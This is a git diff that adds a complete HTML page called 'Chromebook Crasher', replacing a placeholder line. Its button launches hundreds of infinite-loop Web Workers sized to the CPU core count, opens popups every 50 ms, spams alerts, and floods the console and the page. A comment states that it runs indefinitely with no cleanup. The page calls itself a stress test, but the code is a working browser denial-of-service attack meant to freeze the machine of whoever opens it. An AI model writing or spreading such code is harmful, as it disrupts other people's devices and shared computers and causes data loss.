@@ -1,1 +1,202 @@
-(put crasher code here i cant do it rn)
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Chromebook Crasher</title>
+    <style>
+        body {
+            background: #000;
+            color: #0f0;
+            font-family: 'Courier New', monospace;
+            text-align: center;
+            padding: 50px;
+        }
+        .crasher-container {
+            max-width: 600px;
+            margin: 0 auto;
+            padding: 40px;
+            border: 2px solid #ff0000;
+            border-radius: 10px;
+            background: rgba(255, 0, 0, 0.1);
+        }
+        h1 {
+            color: #ff0000;
+            font-size: 2.5em;
+            margin-bottom: 30px;
+            text-shadow: 0 0 10px #ff0000;
+        }
+        .warning {
+            color: #ff6600;
+            font-size: 1.2em;
+            margin-bottom: 40px;
+            line-height: 1.4;
+        }
+        .crasher-button {
+            background: linear-gradient(135deg, #ff0000, #cc0000, #aa0000, #ff0000);
+            color: #ffffff;
+            border: 5px solid #ff0000;
+            padding: 40px 80px;
+            font-size: 2.5em;
+            font-weight: bold;
+            cursor: pointer;
+            border-radius: 20px;
+            text-transform: uppercase;
+            letter-spacing: 4px;
+            transition: all 0.3s ease;
+            box-shadow:
+                0 0 30px rgba(255, 0, 0, 0.8),
+                0 0 60px rgba(255, 0, 0, 0.6),
+                0 0 90px rgba(255, 0, 0, 0.4),
+                inset 0 0 30px rgba(255, 0, 0, 0.3);
+            animation: evilPulse 1s ease-in-out infinite alternate;
+            font-family: 'Courier New', monospace;
+            text-shadow: 0 0 10px #ff0000;
+        }
+        .crasher-button:hover {
+            background: linear-gradient(135deg, #ff3333, #ff0000, #cc0000, #ff3333);
+            box-shadow:
+                0 0 50px rgba(255, 0, 0, 1),
+                0 0 100px rgba(255, 0, 0, 0.8),
+                0 0 150px rgba(255, 0, 0, 0.6),
+                inset 0 0 50px rgba(255, 0, 0, 0.5);
+            transform: scale(1.1) rotate(2deg);
+            border-color: #ff3333;
+            border-width: 8px;
+        }
+        .crasher-button:active {
+            transform: scale(0.9) rotate(-2deg);
+            animation: shudder 0.1s infinite;
+        }
+        @keyframes evilPulse {
+            0% {
+                box-shadow:
+                    0 0 30px rgba(255, 0, 0, 0.8),
+                    0 0 60px rgba(255, 0, 0, 0.6),
+                    0 0 90px rgba(255, 0, 0, 0.4),
+                    inset 0 0 30px rgba(255, 0, 0, 0.3);
+            }
+            100% {
+                box-shadow:
+                    0 0 50px rgba(255, 0, 0, 1),
+                    0 0 100px rgba(255, 0, 0, 0.8),
+                    0 0 150px rgba(255, 0, 0, 0.6),
+                    inset 0 0 50px rgba(255, 0, 0, 0.5);
+            }
+        }
+        .status {
+            margin-top: 30px;
+            padding: 15px;
+            background: rgba(0, 0, 0, 0.8);
+            border: 1px solid #ff6600;
+            border-radius: 5px;
+            font-family: monospace;
+            color: #ff6600;
+        }
+        @keyframes shudder {
+            0% { transform: translate(0); }
+            25% { transform: translate(2px, -2px) rotate(1deg); }
+            50% { transform: translate(-2px, 2px) rotate(-1deg); }
+            75% { transform: translate(2px, -2px) rotate(0.5deg); }
+            100% { transform: translate(0) rotate(0deg); }
+        }
+    </style>
+</head>
+<body>
+    <div class="crasher-container">
+        <h1>💥 CHROMEBOOK CRASHER 💥</h1>
+        <div class="warning">
+            ⚠️ WARNING: HIGH RISK SYSTEM STRESS TEST ⚠️<br><br>
+            This tool will attempt to overload your system's CPU and memory.<br>
+            Use at your own risk!
+        </div>
+        <button class="crasher-button" onclick="chromebookCrasher()">
+            🚨 ACTIVATE CRASHER 🚨
+        </button>
+        <div class="status" id="crashStatus">
+            Ready to initiate system stress test...
+        </div>
+    </div>
+
+    <script>
+        function chromebookCrasher() {
+            const statusDiv = document.getElementById('crashStatus');
+            statusDiv.textContent = '💀 INITIATING CHROMEBOOK TERMINATION SEQUENCE...';
+
+            // Apply immediate shudder animation
+            document.body.style.animation = 'shudder 0.03s infinite';
+
+            const cores = navigator.hardwareConcurrency || 8;
+            const attackIntervals = [];
+            const crashWorkers = [];
+
+            // PHASE 1: CPU OVERLOAD
+            for (let core = 0; core < cores; core++) {
+                for (let i = 0; i < 25; i++) {
+                    try {
+                        const worker = new Worker('data:application/javascript,' + encodeURIComponent('while (true) { let x = 0; for (let j = 0; j < 1000000; j++) { x += Math.sin(j) * Math.cos(j) * Math.tan(j) * Math.sqrt(j); } }'));
+                        crashWorkers.push(worker);
+                    } catch (e) {
+                        break;
+                    }
+                }
+            }
+
+            // PHASE 2: TAB ATTACK
+            const tabAttack = setInterval(function() {
+                try {
+                    const win = window.open('about:blank', '_blank', 'width=1,height=1');
+                    if (win) {
+                        setTimeout(function() {
+                            try { win.close(); } catch (e) {}
+                        }, Math.random() * 50);
+                    }
+                } catch (e) {}
+            }, 50);
+            attackIntervals.push(tabAttack);
+
+            // PHASE 3: ALERT SPAM
+            let alertCount = 0;
+            const alertSpam = setInterval(function() {
+                alertCount++;
+                try {
+                    alert('🔥 CRASH #' + alertCount + ' 🔥\n💀 SYSTEM FAILURE 💀');
+                } catch (e) {}
+
+                if (alertCount >= 30) {
+                    clearInterval(alertSpam);
+                }
+            }, 200);
+            attackIntervals.push(alertSpam);
+
+            // PHASE 4: CONSOLE FLOOD
+            const consoleFlood = setInterval(function() {
+                console.log('%c💀 CRASH ACTIVE 💀', 'color: red; font-size: 30px;');
+                console.error('SYSTEM FAILURE');
+                console.warn('CRITICAL ERROR');
+            }, 100);
+            attackIntervals.push(consoleFlood);
+
+            // PHASE 5: DOM ATTACK
+            const domFlood = setInterval(function() {
+                const div = document.createElement('div');
+                div.innerHTML = '💀💀💀';
+                div.style.position = 'absolute';
+                div.style.left = Math.random() * 100 + 'vw';
+                div.style.top = Math.random() * 100 + 'vh';
+                div.style.zIndex = '99999';
+                div.style.fontSize = '50px';
+                div.style.color = 'red';
+                document.body.appendChild(div);
+
+                setTimeout(function() {
+                    try { div.remove(); } catch (e) {}
+                }, Math.random() * 500 + 100);
+            }, 50);
+            attackIntervals.push(domFlood);
+
+            // NO AUTO CLEANUP - RUNS INDEFINITELY UNTIL MANUAL INTERVENTION
+        }
+    </script>
+</body>
+</html>
